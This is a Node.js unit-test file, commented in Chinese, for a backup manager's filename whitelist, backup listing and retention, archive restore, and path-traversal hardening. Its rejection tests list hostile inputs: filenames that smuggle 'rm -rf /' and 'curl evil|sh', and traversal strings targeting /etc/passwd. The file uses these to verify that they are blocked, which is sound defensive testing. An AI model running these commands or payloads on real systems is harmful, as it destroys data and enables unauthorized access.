/**
 * Unit tests — Backup Manager (src/server.mjs)
 * TASK-002 / framework: node:test (ADR-001)
 *
 * 隔離策略：
 *  - 每個 test 在 mkdtempSync 的 temp dir 裡模擬 PAAW_ROOT（data/ .paaw/）與 BACKUP_DIR
 *  - PAAW_ROOT / PAAW_BACKUP_DIR / PAAW_EVENT_LOG 在 import 時讀取，
 *    因此每個 test 用 unique query string 重新 dynamic import（cache-bust）
 *  - server.mjs 有 main guard，import 不會 listen :4199、不會 spawn PAAW
 */
import { test, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import {
  mkdtempSync, rmSync, mkdirSync, writeFileSync,
  readdirSync, existsSync, readFileSync, utimesSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve, sep } from "node:path";
import { execFileSync } from "node:child_process";

let server;      // module under test（每個 test 重新 import）
let tmp;         // temp root（afterEach 整個刪掉）
let paawRoot;    // 模擬的 PAAW 資料根目錄（data/ .paaw/）
let backupDir;
let importSeq = 0;

async function loadServer(extraEnv = {}) {
  process.env.PAAW_ROOT = paawRoot;
  process.env.PAAW_BACKUP_DIR = backupDir;
  process.env.PAAW_EVENT_LOG = join(tmp, "events.jsonl");
  for (const [k, v] of Object.entries(extraEnv)) process.env[k] = v;
  importSeq += 1;
  // unique query → 繞過 ESM cache，確保本輪的 env 生效
  server = await import(`../../src/server.mjs?case=${importSeq}`);
  return server;
}

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "paaw-backup-test-"));
  paawRoot = join(tmp, "paaw-root");
  backupDir = join(tmp, "backups");
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

/** 在 paawRoot 建立可備份的資料（data/ + .paaw/） */
function makePaawData(dbContent = "db-v1") {
  mkdirSync(join(paawRoot, "data"), { recursive: true });
  mkdirSync(join(paawRoot, ".paaw"), { recursive: true });
  writeFileSync(join(paawRoot, "data", "db.json"), dbContent);
  writeFileSync(join(paawRoot, ".paaw", "state.json"), '{"v":1}');
}

/** 在 backupDir 放一個「檔名合法」的假備份（內容不需要是真的 tar，listBackups 只 stat） */
function seedNamedBackup(filename, mtime) {
  mkdirSync(backupDir, { recursive: true });
  const p = join(backupDir, filename);
  writeFileSync(p, "fake-tar-gz-bytes");
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

/** 用真 tar 打包 paawRoot 現有內容 → 產生「內容有效」的備份檔（restore 測試用） */
function makeRealBackupArchive(filename) {
  mkdirSync(backupDir, { recursive: true });
  execFileSync("tar", ["czf", join(backupDir, filename), "data", ".paaw"], {
    cwd: paawRoot, encoding: "utf-8",
  });
}

// ─────────────────────────────────────────────────────────────
// 1. BACKUP_REGEX 白名單
// ─────────────────────────────────────────────────────────────

test("BACKUP_REGEX accepts the legal paaw-backup-YYYY-MM-DD-HH.tar.gz format", async () => {
  const { BACKUP_REGEX } = await loadServer();
  assert.equal(BACKUP_REGEX.test("paaw-backup-2026-08-25-14.tar.gz"), true, "spec 範例檔名");
  assert.equal(BACKUP_REGEX.test("paaw-backup-2099-12-31-23.tar.gz"), true, "邊界日期");
  assert.equal(BACKUP_REGEX.test("paaw-backup-0000-01-01-00.tar.gz"), true, "邊界全零");
});

test("BACKUP_REGEX rejects path traversal, wrong date format, and injection names", async () => {
  const { BACKUP_REGEX } = await loadServer();
  const rejects = [
    "../etc/passwd",                              // path traversal
    "..\\..\\x",                                  // windows traversal
    "paaw-backup-20260825-14.tar.gz",             // ★ QA 抓到的舊錯誤格式（YYYYMMDD）
    "paaw-backup-.tar.gz",                        // 日期整段缺失
    "paaw-backup-2026-08-25.tar.gz",              // 少 -HH
    "paaw-backup-2026-08-25-14.tar.gz.exe",       // 雙副檔名
    "paaw-backup-2026-08-25-14.tar.gz;rm -rf /",  // shell 注入 ;
    "paaw-backup-2026-08-25-14.tar.gz && curl evil|sh", // shell 注入 &&
    "paaw-backup-2026-08-25-14.tar.gz\x00",       // NUL byte
    "paaw-backup-2026-08-25-14.tar.gz\n",         // 換行 smuggling
  ];
  for (const name of rejects) {
    assert.equal(BACKUP_REGEX.test(name), false, `must reject: ${JSON.stringify(name)}`);
  }
});

// ─────────────────────────────────────────────────────────────
// 2. ★ Regression invariant（TASK-001 critical bug 根因）
// ─────────────────────────────────────────────────────────────

test("★ invariant: filename produced by createBackup must pass BACKUP_REGEX", async () => {
  makePaawData();
  const { createBackup, BACKUP_REGEX, BACKUP_DATE_REGEX } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, true, `createBackup 應成功: ${JSON.stringify(result)}`);
  assert.ok(typeof result.filename === "string", "必須回傳 filename");
  // ↓ 這行就是上次 critical bug 的防火牆：產生端與驗證端格式必須一致
  assert.equal(
    BACKUP_REGEX.test(result.filename), true,
    `createBackup 產生的 "${result.filename}" 必須通過 BACKUP_REGEX`,
  );
  assert.match(result.filename, BACKUP_DATE_REGEX, "也必須能被 BACKUP_DATE_REGEX 解析出日期");
  assert.ok(result.size > 0, "size 應 > 0");
});

// ─────────────────────────────────────────────────────────────
// 3. listBackups
// ─────────────────────────────────────────────────────────────

test("listBackups returns only whitelisted backups, ignoring .DS_Store and invalid names", async () => {
  seedNamedBackup("paaw-backup-2026-01-10-08.tar.gz");
  seedNamedBackup("paaw-backup-2026-01-11-09.tar.gz");
  seedNamedBackup(".DS_Store");
  seedNamedBackup("paaw-backup-20260110-08.tar.gz");   // QA 抓到的錯誤格式
  seedNamedBackup("paaw-backup-.tar.gz");
  seedNamedBackup("notes.txt");
  seedNamedBackup("paaw-backup-2026-01-12-10.tar.gz.exe");

  const { listBackups, BACKUP_REGEX } = await loadServer();
  const backups = listBackups();

  assert.equal(backups.length, 2, `應只剩 2 個合法備份，實得: ${backups.map(b => b.filename)}`);
  for (const b of backups) {
    assert.equal(BACKUP_REGEX.test(b.filename), true);
    assert.ok(typeof b.size === "number" && b.size > 0);
    assert.ok(typeof b.created === "string");
  }
  assert.deepEqual(
    backups.map(b => b.filename).sort(),
    ["paaw-backup-2026-01-10-08.tar.gz", "paaw-backup-2026-01-11-09.tar.gz"].sort(),
  );
  // date 欄位解析自檔名
  assert.equal(backups.find(b => b.filename === "paaw-backup-2026-01-10-08.tar.gz").date, "2026-01-10-08");
});

test("listBackups sorts newest-first by mtime", async () => {
  seedNamedBackup("paaw-backup-2026-01-01-01.tar.gz", new Date("2026-01-01T01:00:00Z"));
  seedNamedBackup("paaw-backup-2026-02-02-02.tar.gz", new Date("2026-02-02T02:00:00Z"));
  seedNamedBackup("paaw-backup-2026-03-03-03.tar.gz", new Date("2026-03-03T03:00:00Z"));

  const { listBackups } = await loadServer();
  assert.deepEqual(
    listBackups().map(b => b.filename),
    [
      "paaw-backup-2026-03-03-03.tar.gz",
      "paaw-backup-2026-02-02-02.tar.gz",
      "paaw-backup-2026-01-01-01.tar.gz",
    ],
  );
});

test("listBackups returns [] when backup dir does not exist", async () => {
  const { listBackups } = await loadServer();
  assert.deepEqual(listBackups(), []);
});

// ─────────────────────────────────────────────────────────────
// 4. createBackup
// ─────────────────────────────────────────────────────────────

test("createBackup produces a real, extractable tar.gz in BACKUP_DIR", async () => {
  makePaawData("hello-backup");
  const { createBackup } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, true, JSON.stringify(result));
  const filepath = join(backupDir, result.filename);
  assert.ok(existsSync(filepath), `備份檔必須真的存在: ${filepath}`);

  // 用 tar -tzf 驗證是真 tar.gz 且包含 data/（不是空殼檔案）
  const entries = execFileSync("tar", ["-tzf", filepath], { encoding: "utf-8" });
  assert.match(entries, /(^|\/)data\//, `tar 內容應含 data/: ${entries}`);
});

test("createBackup returns { ok:false } when PAAW_ROOT has nothing to back up", async () => {
  // paawRoot 存在但沒有 data/ 也沒有 .paaw/ → tar 無成員 → 失敗路徑
  mkdirSync(paawRoot, { recursive: true });
  const { createBackup } = await loadServer();
  const result = createBackup("unit-test");

  assert.equal(result.ok, false, "無可備份內容時應回報失敗而非 throw");
  assert.ok(typeof result.error === "string" && result.error.length > 0);
});

test("createBackup prunes oldest backups beyond PAAW_MAX_BACKUPS (retention)", async () => {
  makePaawData();
  // 預先放 4 個合法舊備份（mtime 由舊到新）
  seedNamedBackup("paaw-backup-2026-01-01-01.tar.gz", new Date("2026-01-01T01:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-02-02.tar.gz", new Date("2026-01-02T02:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-03-03.tar.gz", new Date("2026-01-03T03:00:00Z"));
  seedNamedBackup("paaw-backup-2026-01-04-04.tar.gz", new Date("2026-01-04T04:00:00Z"));

  const { createBackup, listBackups } = await loadServer({ PAAW_MAX_BACKUPS: "3" });
  const result = createBackup("unit-test");
  assert.equal(result.ok, true, JSON.stringify(result));

  const remaining = listBackups();
  assert.equal(remaining.length, 3, "retention 上限 3：新增後應只保留 3 個");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-01-01.tar.gz")), false, "最舊的應被刪除");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-02-02.tar.gz")), false, "次舊的應被刪除");
  assert.equal(existsSync(join(backupDir, "paaw-backup-2026-01-04-04.tar.gz")), true);
});

// ─────────────────────────────────────────────────────────────
// 5. restoreBackup
// ─────────────────────────────────────────────────────────────

test("restoreBackup rejects path-traversal and injection filenames without touching disk", async () => {
  makePaawData();
  const { restoreBackup } = await loadServer();
  const attacks = [
    "../../etc/passwd",
    "..\\..\\x",
    "paaw-backup-20260825-14.tar.gz",
    "paaw-backup-.tar.gz",
    "paaw-backup-2026-08-25-14.tar.gz;rm -rf /",
  ];
  for (const name of attacks) {
    const r = restoreBackup(name);
    assert.equal(r.ok, false, `應拒絕: ${name}`);
    assert.match(r.error, /invalid/i, `錯誤訊息應標明 invalid: ${r.error}`);
  }
  assert.equal(existsSync(backupDir), false, "被拒絕時連 BACKUP_DIR 都不應被建立");
});

test("restoreBackup returns { ok:false, 'not found' } for a valid-format but missing file", async () => {
  mkdirSync(backupDir, { recursive: true });
  const { restoreBackup } = await loadServer();
  const r = restoreBackup("paaw-backup-2020-01-01-01.tar.gz");
  assert.equal(r.ok, false);
  assert.match(r.error, /not found/i);
});

test("restoreBackup restores data/ and .paaw/ and creates a pre-restore safety backup", async () => {
  // Arrange：打包「舊內容」成過去日期的合法備份（刻意用過去日期，避開 safety backup 同小時撞名）
  makePaawData("old-content-v1");
  mkdirSync(backupDir, { recursive: true });
  const restoreTarget = "paaw-backup-2026-01-15-08.tar.gz";
  makeRealBackupArchive(restoreTarget);

  // 備份後，線上資料被改壞
  writeFileSync(join(paawRoot, "data", "db.json"), "changed-after-backup");
  const { restoreBackup, listBackups } = await loadServer();

  assert.equal(listBackups().length, 1, "restore 前應只有 1 個備份");

  // Act
  const r = restoreBackup(restoreTarget);

  // Assert：資料回滚 + safety backup 出現
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(readFileSync(join(paawRoot, "data", "db.json"), "utf-8"), "old-content-v1");
  assert.equal(readFileSync(join(paawRoot, ".paaw", "state.json"), "utf-8"), '{"v":1}');

  const after = listBackups();
  assert.equal(after.length, 2, `還原前應自動產生 safety backup（1→2）: ${after.map(b => b.filename)}`);
  assert.ok(
    after.some(b => b.filename === restoreTarget),
    "原備份檔應 still 存在",
  );
  assert.ok(
    after.some(b => b.filename !== restoreTarget),
    "應多出一個新的 safety backup",
  );
});

test("restoreBackup returns { ok:false } when the archive is corrupt", async () => {
  makePaawData(); // 讓 safety createBackup 有東西可包
  seedNamedBackup("paaw-backup-2026-02-02-02.tar.gz"); // 內容是假 bytes，非真 tar
  const { restoreBackup } = await loadServer();
  const r = restoreBackup("paaw-backup-2026-02-02-02.tar.gz");

  assert.equal(r.ok, false, "解不開的檔案應回報失敗而非 throw");
  assert.ok(typeof r.error === "string" && r.error.length > 0);
});

// ─────────────────────────────────────────────────────────────
// 6. backupPath — CWE-22 safe-path hardening（TASK-010 commit 114bfb2）
//    契約（src/server.mjs:79-85）：
//      typeof 非字串            → null
//      BACKUP_REGEX 白名單不過  → null
//      resolve 後逃離 BACKUP_DIR → null（containment：startsWith(resolve(BACKUP_DIR)+sep)）
//      其餘                     → BACKUP_DIR 內的絕對路徑
//    listBackups / createBackup / restoreBackup（:361/:383/:401/:416）全面走此函式。
// ─────────────────────────────────────────────────────────────

test("backupPath returns an absolute path contained in BACKUP_DIR for legal names", async () => {
  const { backupPath } = await loadServer();
  const legal = [
    "paaw-backup-2026-09-19-10.tar.gz",  // TASK-011 指定案例
    "paaw-backup-0000-01-01-00.tar.gz",  // 邊界全零
    "paaw-backup-2099-12-31-23.tar.gz",  // 邊界日期
  ];
  for (const name of legal) {
    const p = backupPath(name);
    assert.ok(typeof p === "string", `合法名稱要回路徑字串，實得: ${p}`);
    assert.equal(p, join(backupDir, name), "必須是 BACKUP_DIR 內的確切絕對路徑");
    assert.ok(p.startsWith(backupDir + sep), `containment：${p} 必須在 ${backupDir}${sep} 之下`);
    assert.ok(!p.includes(".."), "結果路徑不得殘留 .. 片段");
  }
});

test("backupPath returns null for path-traversal payloads (regex + containment 雙層)", async () => {
  const { backupPath } = await loadServer();
  const attacks = [
    "../../etc/passwd",                                  // 純 ../ 逃逸
    "paaw-backup-../evil.tar.gz",                        // TASK-011 指定案例：前綴混入 ../
    "../paaw-backup-2026-09-19-10.tar.gz",               // TASK-011 指定案例：前導 ../
    "paaw-backup-2026-09-19-10/../../evil.tar.gz",       // 中段逃逸
    "..\\..\\windows\\win.ini",                          // Windows 反斜線
    "paaw-backup-2026-09-19-10.tar.gz\\..\\..\\x",       // 尾部反斜線逃逸
    "..%2f..%2fetc%2fpasswd",                            // percent-encoded（HTTP 路由不 decode，原樣抵達）
    "%2e%2e%2fconfig.json",                              // percent-encoded 點
    "paaw-backup-2026-09-19-10.tar.gz%00",               // NUL 後綴
    "paaw-backup-2026-09-19-10.tar.gz\n",                // 換行 smuggling
    "paaw-backup-2026-09-19-10.tar.gz;rm -rf /",         // shell 注入
  ];
  for (const name of attacks) {
    assert.equal(backupPath(name), null, `逃逸 payload 必須回 null: ${JSON.stringify(name)}`);
  }
});

test("backupPath returns null for absolute-path injection", async () => {
  const { backupPath } = await loadServer();
  const attacks = [
    "/etc/paaw-backup-x.tar.gz",                 // TASK-011 指定案例：絕對路徑（格式也不符）
    "/etc/paaw-backup-2026-09-19-10.tar.gz",     // 格式合法的絕對路徑 —— 仍必須拒絕
    "/etc/passwd",                               // 經典目標
    "//etc/passwd",                              // protocol-relative 風格雙斜線
    "C:\\Windows\\paaw-backup-2026-09-19-10.tar.gz", // Windows 絕對路徑
  ];
  for (const name of attacks) {
    assert.equal(backupPath(name), null, `絕對路徑注入必須回 null: ${JSON.stringify(name)}`);
  }
});

test("backupPath returns null (not a throw) for non-string inputs", async () => {
  const { backupPath } = await loadServer();
  // restore 路由只會給字串，但 backupPath 是匯出函式 —— 任何呼叫者的型別錯誤
  // 都必須 fail-closed（null），絕不可以 throw 炸掉 handler
  const nonStrings = [undefined, null, 0, 42, NaN, true, {}, [], ["paaw-backup-2026-09-19-10.tar.gz"], () => {}, Symbol("paaw-backup-2026-09-19-10.tar.gz"), 123n];
  for (const v of nonStrings) {
    assert.equal(backupPath(v), null, `非字串必須回 null: ${String(v)} (${typeof v})`);
  }
});

test("backupPath returns null for format violations of BACKUP_REGEX", async () => {
  const { backupPath } = await loadServer();
  const invalid = [
    "",                                          // 空字串（TASK-011 指定案例）
    "paaw-backup-.tar.gz",                       // 日期整段缺失
    "paaw-backup-2026-09-19.tar.gz",             // 缺 -HH（TASK-011 指定案例）
    "paaw-backup-20260919-10.tar.gz",            // 緊湊日期 YYYYMMDD（QA 抓過的舊格式）
    "paaw-backup-2026-09-19-10.tgz",             // 錯副檔名（TASK-011 指定案例）
    "paaw-backup-2026-09-19-10.tar.bz2",         // 錯副檔名
    "paaw-backup-2026-09-19-10.tar.gz.exe",      // 雙副檔名
    "paaw-backup-2026-09-19-10.tar.gz ",         // 尾端空白
    " paaw-backup-2026-09-19-10.tar.gz",         // 前導空白
    "PAAW-BACKUP-2026-09-19-10.tar.gz",          // 大小寫變體（白名單是 case-sensitive）
    "paaw-backup-2026-09-19-10.tar.gz\x00",      // NUL byte
  ];
  for (const name of invalid) {
    assert.equal(backupPath(name), null, `格式非法必須回 null: ${JSON.stringify(name)}`);
  }
});

test("backupPath stays consistent when BACKUP_DIR is configured with a trailing separator", async () => {
  // 尾斜線不得造成雙分隔或 containment 誤判（resolve 會正規化）
  const { backupPath } = await loadServer({ PAAW_BACKUP_DIR: backupDir + "/" });
  const name = "paaw-backup-2026-09-19-10.tar.gz";
  const p = backupPath(name);
  assert.equal(p, join(backupDir, name), "尾斜線 config 的結果必須與正規 config 完全一致");
  assert.ok(p.startsWith(resolve(backupDir) + sep), "containment 前綴判斷不受尾斜線影響");
});

test("backupPath is purely lexical — mixed-case BACKUP_DIR behaves identically on any filesystem", async () => {
  // macOS 預設是 case-insensitive FS：若 containment 檢查與路徑使用之間有任何磁碟查證，
  // 大小寫差異就可能造成 check/use divergence。backupPath 不碰磁碟 → 結果與 FS 無關。
  const mixedDir = join(tmp, "BackUps"); // 刻意不 mkdir —— 證明從未觸碰磁碟
  const { backupPath } = await loadServer({ PAAW_BACKUP_DIR: mixedDir });
  const name = "paaw-backup-2026-09-19-10.tar.gz";
  const p = backupPath(name);

  assert.equal(p, join(mixedDir, name), "回傳路徑必須逐字元等於 resolve(config, name)（check 與 use 同一字串）");
  assert.ok(p.startsWith(resolve(mixedDir) + sep), "containment 用同一 configured 字串判斷，無 FS 查證");
  // 對照組：攻擊名稱在 mixed-case config 下同樣 null
  assert.equal(backupPath("../paaw-backup-2026-09-19-10.tar.gz"), null);
  assert.equal(backupPath("/etc/paaw-backup-2026-09-19-10.tar.gz"), null);
});

test("defense in depth: restoreBackup handles non-string filenames via backupPath (fail-closed)", async () => {
  makePaawData();
  const { restoreBackup } = await loadServer();
  for (const v of [undefined, null, 42, {}]) {
    const r = restoreBackup(v);
    assert.equal(r.ok, false, `非字串 filename 必須 ok:false: ${String(v)}`);
    assert.match(r.error, /invalid/i, `錯誤訊息標明 invalid: ${r.error}`);
  }
  assert.equal(existsSync(backupDir), false, "被拒絕時不得建立 BACKUP_DIR 或任何檔案");
});

test("listBackups whitelisting is case-sensitive even on case-insensitive filesystems", async () => {
  // macOS 上 "PAAW-BACKUP-...tar.gz" 這個檔案實體存在且讀得到，
  // 但白名單（regex → backupPath）以「逐字元」判斷 —— 大小寫變體不得列入清單
  seedNamedBackup("paaw-backup-2026-01-10-08.tar.gz");   // 合法（正確 case）
  seedNamedBackup("PAAW-BACKUP-2026-01-11-09.tar.gz");   // 大小寫變體（實體檔案存在）
  const { listBackups } = await loadServer();

  const names = listBackups().map((b) => b.filename);
  assert.deepEqual(names, ["paaw-backup-2026-01-10-08.tar.gz"], "大小寫變體必須被過濾");
});
